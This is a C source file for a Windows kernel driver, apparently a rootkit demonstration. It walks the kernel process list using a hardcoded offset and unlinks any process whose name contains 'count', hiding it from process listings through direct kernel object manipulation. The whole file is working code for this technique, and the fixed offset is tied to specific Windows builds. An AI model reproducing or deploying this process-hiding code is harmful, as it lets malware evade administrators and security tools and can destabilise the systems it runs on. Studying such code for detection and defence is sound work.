#include <ntddk.h>

NTKERNELAPI UCHAR* PsGetProcessImageFileName(PEPROCESS Process);

void DriverUnload(PDRIVER_OBJECT DriverObject) {
    UNREFERENCED_PARAMETER(DriverObject);
    DbgPrint("Driver Unloaded.\n");
}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    UNREFERENCED_PARAMETER(DriverObject);
    DriverObject->DriverUnload = DriverUnload;

    PEPROCESS StartProcess = PsGetCurrentProcess();
    PEPROCESS CurrentProcess = StartProcess;
    ULONG_PTR ActiveProcessLinksOffset = 0x1d8;

    do {
        UCHAR* ImageName = PsGetProcessImageFileName(CurrentProcess);
        if (ImageName != NULL && strstr((char*)ImageName, "count")) {
            DbgPrint("Target Found: %s (PID: %p)\n", ImageName, PsGetProcessId(CurrentProcess));
            PLIST_ENTRY TargetList = (PLIST_ENTRY)((PUCHAR)CurrentProcess + ActiveProcessLinksOffset);
            TargetList->Blink->Flink = TargetList->Flink;
            TargetList->Flink->Blink = TargetList->Blink;

            TargetList->Flink = TargetList;
            TargetList->Blink = TargetList;

            DbgPrint("count.exe hidden successfully.\n");
            break;
        }
        PLIST_ENTRY NextLink = (PLIST_ENTRY)((PUCHAR)CurrentProcess + ActiveProcessLinksOffset);
        CurrentProcess = (PEPROCESS)((PUCHAR)NextLink->Flink - ActiveProcessLinksOffset);
    } while (CurrentProcess != StartProcess);

    return STATUS_SUCCESS;
}
